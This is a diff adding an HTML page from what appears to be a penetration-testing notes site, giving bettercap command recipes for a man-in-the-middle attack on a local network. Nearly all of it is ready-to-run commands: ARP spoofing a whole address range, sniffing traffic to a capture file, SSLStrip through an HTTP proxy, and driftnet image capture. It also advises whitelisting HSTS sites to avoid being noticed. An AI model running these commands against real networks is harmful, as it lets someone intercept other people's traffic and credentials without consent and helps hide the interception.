@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Bettercap Quick Commands - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Bettercap Quick Commands", url: "#_top", children: [
+              {title: "One liner", url: "#one-liner" },
+              {title: "Detailed version", url: "#detailed-version" },
+              {title: "Tips", url: "#tips" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="bettercap-quick-commands">Bettercap Quick Commands</h1>
+<p>Beware: Commands might be outdated</p>
+<h2 id="one-liner">One liner</h2>
+<p>Note: Make sure to edit output file <code>&lt;DATE&gt;</code>and list of IP Addresses <code>X.X.X.1-253</code> to spoof</p>
+<ol>
+<li>Run bettercap
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>    ./bettercap -iface eth0 -eval &quot;set net.sniff.filter not arp and not udp dst port 53 and not udp dst port 5353;set net.sniff.output arp.spoof.&lt;DATE&gt;.cap;net.sniff on;set arp.spoof.targets X.X.X.1-253;arp.spoof on&quot;
+</span></code></pre></div></li>
+<li>Open pcap in wireshark and input “http” on the filter box</li>
+</ol>
+<hr />
+<h2 id="detailed-version">Detailed version</h2>
+<ul>
+<li>Basic Setup
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>    net.sniff.output bettercap-output
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>    set net.sniff.filter not arp and not udp dst port 53 and not udp dst port 5353
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    net.sniff on
+</span></code></pre></div></li>
+<li>
+<p>ARP Spoofing part
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>    set arp.spoof.targets x.x.x.1-253 # Make sure to avoid including gateways &amp; network switches
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>    arp.spoof on
+</span></code></pre></div></p>
+</li>
+<li>
+<p>HTTP Proxy for SSLStrip (<em>BEWARE of websites that use HSTS. Avoid or whitelist at all costs to avoid disruption or being noticed</em>)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>    set http.proxy.port 8080
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>    set http.proxy.whitelist &lt;subnet_to_whiltelist_1/24&gt;,&lt;subnet_to_whiltelist_2/28&gt;,&lt;subnet_to_whiltelist_3/32&gt;
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>    set http.proxy.sslstrip &lt;true/false&gt;
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>    http.proxy on
+</span></code></pre></div></p>
+</li>
+<li>Turn of Driftnet
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>    driftnet -d &lt;Driftnet_save_folder_directory&gt; -i eth0
+</span></code></pre></div></li>
+<li>Logging
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>    ./bettercap ... 2&gt;&amp;1 | tee “bettercap.log”
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h2 id="tips">Tips</h2>
+<ul>
+<li>To turn on webUI (<em>WARNING: This will slow down you kali and bettercap a lot. If you slow down you Kali or bettercap, the network/target traffic that you are intercepting slows down too</em>)<ul>
+<li>start bettercap with
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>     ./bettercap -caplet http-ui ... ... ... ...
+</span></code></pre></div></li>
+<li>Manual (Already in bettercap cli)
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>     include http.ui
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>     set http.server.port 8888 
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>     http.server off
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>     http.server on
+</span></code></pre></div></li>
+</ul>
+</li>
+</ul>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/network/attack/arp_poisoning.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
